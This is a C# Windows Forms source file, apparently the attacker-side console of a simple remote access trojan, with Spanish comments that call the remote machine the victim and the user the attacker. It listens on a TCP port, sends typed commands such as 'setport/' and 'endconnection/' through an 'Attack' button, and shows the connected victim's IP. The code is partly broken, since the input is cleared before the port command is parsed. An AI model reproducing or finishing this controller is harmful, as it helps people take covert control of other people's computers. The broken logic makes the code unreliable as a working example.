using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
/**
 * Este programa envía los mensaje para que luego sean analizados por el otro programa 
 * Mostrar mi Ipv4?
 * Ver IPs de [nombre dispositivo]?
 * Recibir mensaje del servidor?
 * cmdfile/ does not work?
 * */
namespace ClientRAT2
{
    public partial class ClientRAT : Form
    {
        public static int port = 32742;//puerto de comuniacion
        public static TcpListener listener = new TcpListener(IPAddress.Any, port);
        public static Thread conn = new Thread(awaitConnection);
        public static TcpClient client;
        public static NetworkStream dataStream;//se envia y recive informacion a traves de aqui
        public static char[] separator = "/".ToCharArray();//":" separa el comando
        public static bool serverstatus = false;//False significa Offline
        

        static void sendMessage(string msg)
        {
            char[] data = msg.ToCharArray();
            byte[] buffer = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                buffer[i] = (byte)data[i];
            }

            try
            {
                dataStream.Write(buffer, 0, buffer.Length);
                dataStream.Flush();
            }//En este caso, si no hay ningun servidor (victima) en linea no se podrá hacer nada
            catch (Exception ex)
            {
                MessageBox.Show("Servers are currently OFFLINE.\nThen, no information will be sent at this point.\nWait until any server is up again. Sorry :(", "¡SERVERS OFFLINE!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
        }
        static void awaitConnection()
        {

            listener.Start();
            client = listener.AcceptTcpClient();
            dataStream = client.GetStream();

        }
        public ClientRAT()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //While loading tries to connect (on another Thread) to server
            conn.Start();
        }
        //Se asegura de que al cerrar se acaben todos los procesos
        private void exit(object sender, FormClosedEventArgs e)
        {
            Environment.Exit(0);
        }

        private void tbEnter_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                bAttack.PerformClick();
            }
        }
        //Cambio el puerto de comuniacion
        public void setport(int _port) { lbOutput.Items.Add( port + "=>" + _port); port = _port; lbOutput.Items.Add("New port: " + port); }
        //Opens new Form with a list of commands 
        private void lCommands_Click(object sender, EventArgs e)
        {
            
        }

        private void tConnectionCheck_Tick(object sender, EventArgs e)
        {
            //Checks connection status
            bool connectionAvaliable = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();

            //show connection status
            if (connectionAvaliable) { lCstatus.Text = "Online"; lCstatus.ForeColor = Color.Orange; }
            else { lCstatus.Text = "Offline"; lCstatus.ForeColor = Color.Red; }

            //show port
            lPortN.Text = port.ToString();

            //show my data
            GetMyData();
        }

        private void lCstatus_Click(object sender, EventArgs e)
        {

        }

        private void lPortN_Click(object sender, EventArgs e)
        {

        }

        private void GetMyData()
        {
            String strHostName = string.Empty;
            // Getting Ip address of local machine...
            // First get the host name of local machine.
            strHostName = Dns.GetHostName();
            // Then using host name, get the IP address list..
            IPHostEntry ipEntry = Dns.GetHostEntry(strHostName);
            IPAddress[] addr = ipEntry.AddressList;

            string myipv4 = "";
            foreach(IPAddress ip in addr)
            {
                if (ip.ToString().Contains("192.168")) { myipv4 = ip.ToString(); }   
            }

            lName.Text = strHostName;
            lIpv4.Text = myipv4;
        }

        private void lIps_Click(object sender, EventArgs e)
        {
            

        }

        private void bAttack_Click(object sender, EventArgs e)
        {
            //Sends command
            sendMessage(tbEnter.Text);
            //Shows last command
            lbOutput.Items.Add(">" + tbEnter.Text + " || " + port + " || " + DateTime.Now.ToString() + " ||");
            //Clears TextBox
            tbEnter.Text = string.Empty;

            //Check if there is a setport request
            try
            {
                string aux = tbEnter.Text;
                string[] temp = aux.Split(separator);
                string command = temp[0];
                string data = temp[1];
                if (command == "setport")
                {
                    setport(Convert.ToInt32(data));
                }
                    
            }
            catch (Exception ex) { }

            
        }

        private void tServerStatus_Tick(object sender, EventArgs e)
        {
            try
            {
                //Tratará de borrar el dataStream (datos que se envian por la red)
                //pero si los servidores están offline, no van a poder, asi que se le avisa al atacante mediante el GUI
                byte[] buffer = new byte[0];
                int offset = 0;
                int size = 0;
                dataStream.Write(buffer, offset, size);
                dataStream.Flush();
                //En caso de que si pueda (hay servidores online), le avisará al ususario (atacante)
                lServersS.Text = "Online";
                lServersS.ForeColor = Color.Orange;
                serverstatus = true;

            }
            catch (Exception ex) { lServersS.Text = "Offline";  lServersS.ForeColor = Color.Red; serverstatus = false; }
        }

        private void lServersS_Click(object sender, EventArgs e)
        {

        }

        private void llastcommand_Click(object sender, EventArgs e)
        {

        }

        public static void victimsIps()
        {
            MessageBox.Show(((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString());
        }

        private void lbOutput_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void lServersStatus_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void bHelp_Click(object sender, EventArgs e)
        {
            Help wf = new Help();
            wf.Show();
        }

        private void bClean_Click(object sender, EventArgs e)
        {
            tbEnter.Text = String.Empty;
        }

        private void gbConnections_Enter(object sender, EventArgs e)
        {

        }

        private void endconnection(object sender, FormClosingEventArgs e)
        {
            if (serverstatus)
            {
                DialogResult result = MessageBox.Show("Closing before ending connection may cause trouble\n\nEnd Connection?","End connection",MessageBoxButtons.YesNo,MessageBoxIcon.Question);
                if (result == DialogResult.Yes) { sendMessage("endconnection/"); } else { }
            }
            else { }
        }
    }
}
